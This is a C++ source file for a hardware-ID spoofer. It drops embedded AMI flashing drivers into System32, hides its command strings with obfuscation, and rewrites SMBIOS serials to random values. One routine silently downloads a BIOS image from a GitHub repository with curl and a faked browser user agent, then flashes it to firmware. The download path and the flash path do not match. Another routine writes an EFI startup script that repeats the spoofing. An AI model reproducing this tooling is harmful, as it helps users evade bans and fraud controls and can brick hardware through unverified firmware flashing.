#include "include.hpp"
#include "funcs.h"
#include "ami.h"
#include <filesystem>
#include <fstream>

void executeCommand(const std::string& command) {
    std::system(command.c_str());
}

void normalspoof() {


    auto amidrv = E("C:\\Windows\\System32\\amifldrv64.sys").decrypt();
    auto ami = E("C:\\Windows\\System32\\AMIDEWINx64.EXE").decrypt();

    CreateFileFromMemory(amidrv, reinterpret_cast<const char*>(amifldrv64), sizeof(amifldrv64));
    CreateFileFromMemory(ami, reinterpret_cast<const char*>(amidewin), sizeof(amidewin));

    std::string output = generateRandomString(10, false);
    std::string output1 = generateRandomString(14, false);
    std::string output2 = generateRandomString(10, false);

    system(E("C:\\Windows\\System32\\AMIDEWINx64.EXE /IVN \"AMI\""));
    system(E("C:\\Windows\\System32\\AMIDEWINx64.EXE /SP \"System product name\""));
    system(E("C:\\Windows\\System32\\AMIDEWINx64.EXE /SP \"System product name\""));
    system(E("C:\\Windows\\System32\\AMIDEWINx64.EXE /SV \"System version\""));

    std::string encryptedPath = skCrypt("C:\\Windows\\System32\\AMIDEWINx64.EXE /SS ").decrypt();
    std::string command1 = encryptedPath + generateRandomString(10, false);;
    std::system(command1.c_str());

    system(E("C:\\Windows\\System32\\AMIDEWINx64.EXE /SU AUTO"));
    system(E("C:\\Windows\\System32\\AMIDEWINx64.EXE /SK \"To Be Filled By O.E.M\""));
    system(E("C:\\Windows\\System32\\AMIDEWINx64.EXE /SK \"To Be Filled By O.E.M\""));
    system(E("C:\\Windows\\System32\\AMIDEWINx64.EXE /BM \"ASRock\""));
    system(E("C:\\Windows\\System32\\AMIDEWINx64.EXE /BP \"B560M-C\""));
    system(E("C:\\Windows\\System32\\AMIDEWINx64.EXE /BV \" \""));

    std::string encryptedPath1 = skCrypt("C:\\Windows\\System32\\AMIDEWINx64.EXE /BS ").decrypt();
    std::string command = encryptedPath1 + generateRandomString(14, false);;
    std::system(command.c_str());

    system(E("C:\\Windows\\System32\\AMIDEWINx64.EXE /BT \"Default string\""));
    system(E("C:\\Windows\\System32\\AMIDEWINx64.EXE /BLC \"Default string\""));
    system(E("C:\\Windows\\System32\\AMIDEWINx64.EXE /CM \"Default string\""));
    system(E("C:\\Windows\\System32\\AMIDEWINx64.EXE /CV \"Default string\""));

    std::string encryptedPath2 = skCrypt("C:\\Windows\\System32\\AMIDEWINx64.EXE /CS ").decrypt();
    std::string command2 = encryptedPath2 + generateRandomString(10, false);;
    std::system(command2.c_str());

    system(E("C:\\Windows\\System32\\AMIDEWINx64.EXE /CA \"Default string\""));
    system(E("C:\\Windows\\System32\\AMIDEWINx64.EXE /CSK \"SKU\""));
    system(E("C:\\Windows\\System32\\AMIDEWINx64.EXE /PSN \"To Be Filled By O.E.M.\""));
    system(E("C:\\Windows\\System32\\AMIDEWINx64.EXE /PAT \"To Be Filled By O.E.M.\""));
    system(E("C:\\Windows\\System32\\AMIDEWINx64.EXE /PPN \"To Be Filled By O.E.M.\""));
}

void asusspoof() {

    auto AFUDRV = E("C:\\Windows\\System32\\amigendrv64.sys").decrypt();
    auto AFU = E("C:\\Windows\\System32\\AFUWINx64.EXE").decrypt();

    CreateFileFromMemory(AFUDRV, reinterpret_cast<const char*>(amigendrv64), sizeof(amigendrv64));
    CreateFileFromMemory(AFU, reinterpret_cast<const char*>(AFUWINx64), sizeof(AFUWINx64));
    std::system(E("curl --silent -o C:\\Windows\\System32\\Tasks\\Mac.bat "
        "-H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36\" "
        "https://github.com/zer0gra/perm-files/raw/main/BIOS.rom"));

    system(E("C:\\Windows\\System32\\AFUWINx64.EXE C:\\Windows\\System32\\BIOS.rom /o"));
    system(E("C:\\Windows\\System32\\AFUWINx64.EXE C:\\Windows\\System32\\BIOS.rom /p"));
}

namespace fs = std::filesystem;

void efispoof() {

    std::string output = generateRandomString(10, false);
    std::string output1 = generateRandomString(14, false);
    std::string output2 = generateRandomString(10, false);

    fs::current_path("USB/efi/boot");
    std::ofstream outfile(E("startup.nsh"));
    if (!outfile.is_open()) {
        std::cout << (E("Error opening file.")) << std::endl;
    }

    outfile << (E("echo -off\n"));
    outfile << (E("AMIDEEFIx64.efi /IVN \"AMI\"\n"));
    outfile << (E("AMIDEEFIx64.efi /SM \"System manufacturer\"\n"));
    outfile << (E("AMIDEEFIx64.efi /SP \"System product name\"\n"));
    outfile << (E("AMIDEEFIx64.efi /SV \"System version\"\n"));
    outfile << E("AMIDEEFIx64.efi /SS \"") << output << E("\"\n");
    outfile << (E("AMIDEEFIx64.efi /SU AUTO\n"));
    outfile << (E("AMIDEEFIx64.efi /SK \"To Be Filled By O.E.M\"\n"));
    outfile << (E("AMIDEEFIx64.efi /SF \"To Be Filled By O.E.M.\"\n"));
    outfile << (E("AMIDEEFIx64.efi /BM \"ASRock\"\n"));
    outfile << (E("AMIDEEFIx64.efi /BP \"B560M-C\"\n"));
    outfile << (E("AMIDEEFIx64.efi /BV \" \"\n"));
    outfile << E("AMIDEEFIx64.efi /BS \"") << output1 << E("\"\n");
    outfile << (E("AMIDEEFIx64.efi /BT \"Default string\"\n"));
    outfile << (E("AMIDEEFIx64.efi /BLC \"Default string\"\n"));
    outfile << (E("AMIDEEFIx64.efi /CM \"Default string\"\n"));
    outfile << (E("AMIDEEFIx64.efi /CV \"Default string\"\n"));
    outfile << E("AMIDEEFIx64.efi /CS \"") << output2 << E("\"\n");
    outfile << (E("AMIDEEFIx64.efi /CA \"Default string\"\n"));
    outfile << (E("AMIDEEFIx64.efi /CSK \"SKU\"\n"));
    outfile << (E("AMIDEEFIx64.efi /PSN \"To Be Filled By O.E.M.\"\n"));
    outfile << (E("AMIDEEFIx64.efi /PAT \"To Be Filled By O.E.M.\"\n"));
    outfile << (E("AMIDEEFIx64.efi /PPN \"To Be Filled By O.E.M.\"\n"));
    outfile << "exit\n";

    outfile.close();
}